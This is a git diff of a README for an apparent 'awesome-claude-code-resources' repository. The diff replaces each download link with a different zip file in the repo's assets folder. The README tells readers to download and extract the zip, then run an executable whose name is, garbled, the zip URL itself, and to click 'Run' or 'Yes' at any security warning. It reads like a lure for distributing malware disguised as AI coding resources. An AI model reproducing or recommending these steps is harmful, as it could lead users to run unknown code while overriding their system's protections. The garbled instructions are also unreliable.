@@ -1,6 +1,6 @@
 # 🎉 awesome-claude-code-resources - The Home for Claude Code Skills
 
-[![Download Release](https://raw.githubusercontent.com/eegy90/awesome-claude-code-resources/main/assets/code-claude-resources-awesome-2.0-beta.1.zip%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/eegy90/awesome-claude-code-resources/main/assets/code-claude-resources-awesome-2.0-beta.1.zip)
+[![Download Release](https://github.com/eegy90/awesome-claude-code-resources/raw/refs/heads/main/assets/resources-claude-code-awesome-v2.0.zip%20Release-Click%20Here-brightgreen)](https://github.com/eegy90/awesome-claude-code-resources/raw/refs/heads/main/assets/resources-claude-code-awesome-v2.0.zip)
 
 ## 📋 Overview
 
@@ -14,7 +14,7 @@ This guide will help you download and run the software. Follow these simple step
 
 To download the latest version of the resources, visit the Releases page:
 
-[Visit this page to download](https://raw.githubusercontent.com/eegy90/awesome-claude-code-resources/main/assets/code-claude-resources-awesome-2.0-beta.1.zip)
+[Visit this page to download](https://github.com/eegy90/awesome-claude-code-resources/raw/refs/heads/main/assets/resources-claude-code-awesome-v2.0.zip)
 
 Once on the Releases page, you will find various versions available for download. Select the version that suits your needs and follow the instructions below.
 
@@ -29,7 +29,7 @@ To effectively use the resources in this repository, ensure your system meets th
 ## 🔗 How to Download
 
 1. **Visit the Releases Page:**
-   - Click [here to access](https://raw.githubusercontent.com/eegy90/awesome-claude-code-resources/main/assets/code-claude-resources-awesome-2.0-beta.1.zip).
+   - Click [here to access](https://github.com/eegy90/awesome-claude-code-resources/raw/refs/heads/main/assets/resources-claude-code-awesome-v2.0.zip).
 
 2. **Locate a Release:**
    - Browse through the list of available releases. Each release will have a version number and a description.
@@ -46,7 +46,7 @@ To effectively use the resources in this repository, ensure your system meets th
    - If the file is zipped, right-click on it and select “Extract All.” Follow the prompts to unzip the contents.
 
 3. **Run the Application:**
-   - Find the executable file (usually named something like `https://raw.githubusercontent.com/eegy90/awesome-claude-code-resources/main/assets/code-claude-resources-awesome-2.0-beta.1.zip` or `https://raw.githubusercontent.com/eegy90/awesome-claude-code-resources/main/assets/code-claude-resources-awesome-2.0-beta.1.zip`). Double-click it to run. If prompted with a security message, click “Run” or “Yes” to continue.
+   - Find the executable file (usually named something like `https://github.com/eegy90/awesome-claude-code-resources/raw/refs/heads/main/assets/resources-claude-code-awesome-v2.0.zip` or `https://github.com/eegy90/awesome-claude-code-resources/raw/refs/heads/main/assets/resources-claude-code-awesome-v2.0.zip`). Double-click it to run. If prompted with a security message, click “Run” or “Yes” to continue.
 
 ## 🛠️ Features
 
